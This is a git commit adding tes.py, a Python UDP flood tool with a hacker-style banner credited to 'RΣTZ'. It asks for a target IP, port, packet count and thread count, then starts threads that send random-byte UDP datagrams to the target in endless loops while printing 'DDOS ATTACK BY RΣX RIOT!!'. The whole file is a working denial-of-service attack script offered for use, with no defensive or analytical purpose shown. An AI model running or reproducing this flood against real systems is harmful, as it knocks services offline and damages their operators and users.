ea8dcc98c284bd70cf7160a4433eb5ceaadf4086
RetZ <96674366+ImRetZ@users.noreply.github.com>
2022-01-22 15:35:03 +0700

    Create tes.py

---
+++ tes.py
@@ -0,0 +1,59 @@
+import random
+import socket
+import threading
+import os
+import time
+
+os.system("clear")
+print('''\033[91mCREDIT BY : RΣTZ.''')
+time.sleep(2)
+print('''
+\033[93m ██▀███  ▓█████▄▄▄█████▓▒███████▒
+▓██ ▒ ██▒▓█   ▀▓  ██▒ ▓▒▒ ▒ ▒ ▄▀░
+▓██ ░▄█ ▒▒███  ▒ ▓██░ ▒░░ ▒ ▄▀▒░ 
+▒██▀▀█▄  ▒▓█  ▄░ ▓██▓ ░   ▄▀▒   ░
+░██▓ ▒██▒░▒████▒ ▒██▒ ░ ▒███████▒
+░ ▒▓ ░▒▓░░░ ▒░ ░ ▒ ░░   ░▒▒ ▓░▒░▒
+  ░▒ ░ ▒░ ░ ░  ░   ░    ░░▒ ▒ ░ ▒
+  ░░   ░    ░    ░      ░ ░ ░ ░ ░
+   ░        ░  ░          ░ ░    ''')
+print("")
+ip = str(input("\033[92mIp Target \033[94m===> "))
+port = int(input("\033[92mPort Target \033[94m===> "))
+times = int(input("\033[92mSend Packets \033[94m===> "))
+threads = int(input("\033[92mSend Threads \033[94m===> "))
+os.system("clear")
+time.sleep(1)
+
+def ppx():
+  data = random._urandom(600)
+  while True:
+  	try:
+  		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  		apa = (str(ip),int(port))
+  		sock.connect((ip,port))
+  		sock.sendto(data,apa)
+  		for x in range(times):
+  			sock.sendto(data,apa)
+  		print("\033[1;36;40mDDOS ATTACK BY \033[1;31;40mRΣX RIOT!!")
+  	except:
+  		print("\033[1;36;40mDDOS ATTACK BY \033[1;31;40mRΣX RIOT!!")
+  		
+def mmx():
+  data = random._urandom(811)
+  while True:
+  	try:
+  		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  		apa = (str(ip),int(port))
+  		sock.connect((ip,port))
+  		sock.sendto(data,apa)
+  		for x in range(times):
+  			sock.sendto(data,apa)
+  		print("\033[1;36;40mDDOS ATTACK BY \033[1;31;40mRΣX RIOT!!")
+  	except:
+  		print("\033[1;36;40mDDOS ATTACK BY \033[1;31;40mRΣX RIOT!!")
+              
+for y in range(threads):
+  rex = threading.Thread(target = ppx)
+  rex = threading.Thread(target = mmx)
+  rex.start()
